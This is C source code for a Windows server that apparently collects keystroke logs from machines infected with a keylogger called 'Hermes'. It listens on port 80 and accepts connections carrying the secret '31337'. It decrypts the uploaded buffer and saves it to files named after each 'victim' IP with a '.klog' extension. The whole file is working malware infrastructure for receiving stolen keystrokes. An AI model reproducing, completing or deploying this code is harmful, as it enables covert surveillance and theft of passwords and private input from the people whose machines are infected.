#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <WinSock2.h>
#include "../alphatools.h"

#pragma comment(lib,"ws2_32.lib") //Winsock Library

#define KEY_SIZE 64
#define TARGET_PORT 80
#define CLIENT_NAME_SIZE 64
#define BUFFER_SIZE 512
#define TIME_BUFFER_SIZE 32
#define SECRET_SIZE 5

SOCKET sockfd, connectionfd;
WSADATA winSockAData;
struct sockaddr_in addr;
int option = sizeof(addr);
PCHAR buf;
CHAR client_ip[CLIENT_NAME_SIZE], key[KEY_SIZE], secret[SECRET_SIZE];

VOID Cleanup();
VOID SaveKeysToFile(PCHAR victim, PCHAR buffer);

VOID SaveKeysToFile(PCHAR victim, PCHAR buffer) {
    CHAR newFileName[MAX_PATH], timeBuffer[TIME_BUFFER_SIZE];
    FILE* fstream;
    ZeroMemory(&newFileName, MAX_PATH);
    ZeroMemory(&timeBuffer, TIME_BUFFER_SIZE);
    time_t tme;
    srand((unsigned)time(&tme));
    
    _itoa_s((int)(rand()), &timeBuffer, TIME_BUFFER_SIZE, 10);
    strcat_s(&newFileName, MAX_PATH, victim);
    strcat_s(&newFileName, MAX_PATH, &timeBuffer);
    strcat_s(&newFileName, MAX_PATH, ".klog");

    fopen_s(&fstream, &newFileName, "wb+");

    fwrite(buffer, strlen(buffer), 1, fstream);

    fclose( fstream );
}

VOID Cleanup() {
    memset(buf, 0x0, 64);
    free(buf);
    closesocket(connectionfd);
    closesocket(sockfd);
    WSACleanup();
    memset((char*)&addr, 0x0, sizeof(addr));
}

int main( int argc, char **argv[] ){

    if ( !isAdmin() ){
        Error((LPCWSTR)L"Run as Admin", (LPCWSTR)L"Info");
    }

    if (WSAStartup(MAKEWORD(2, 2), &winSockAData) != 0) {
        Error((LPCWSTR)L"Could not startup WS.", (LPCWSTR)L"Error");
    }

    sockfd = socket( AF_INET, SOCK_STREAM, 0 ); 
    atexit(Cleanup);
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons( TARGET_PORT );

    if ( ( bind( sockfd, (struct sockaddr_in *)&addr, sizeof( addr ) ) ) < 0 ){
        Error((LPCWSTR)L"Could not bind to port 80", (LPCWSTR)L"Error");
    }
    

    if ( listen( sockfd, 5 ) < 0 ){
        Error((LPCWSTR)L"Could not listen on socket", (LPCWSTR)L"Error");
    }


    printf("[+]Server set up, awaiting connection on port 80.\n");

    buf = (PCHAR)malloc(BUFFER_SIZE);

    while (1) {

        connectionfd = accept(sockfd, (struct sockaddr_in*)&addr, &option);

        if (connectionfd == INVALID_SOCKET) {
            printf("[-]Error: Invalid Socket (%d)\n", GetLastError());
        }


        inet_ntop(AF_INET, &addr.sin_addr.s_addr, client_ip, sizeof(client_ip));

        printf("[+]Recieved connection from: %s\t:%d\n", client_ip, ntohs(addr.sin_port));

        recv(connectionfd, secret, SECRET_SIZE, 0);

        if (!strncmp(secret, "31337", 5)) {

            puts("[*] New keys from Hermes machine detected.");

            recv(connectionfd, &key, KEY_SIZE, 0);

            recv(connectionfd, buf, BUFFER_SIZE, 0);

            alphaCrypt(&key, buf, BUFFER_SIZE);

            SaveKeysToFile(&client_ip, buf);
        }
        else {
            puts("[-] Not a Hermes machine.");
        }

        closesocket(connectionfd);

        ZeroMemory(&client_ip, CLIENT_NAME_SIZE);

        ZeroMemory(&secret, 5);

    }
    return 1;
}
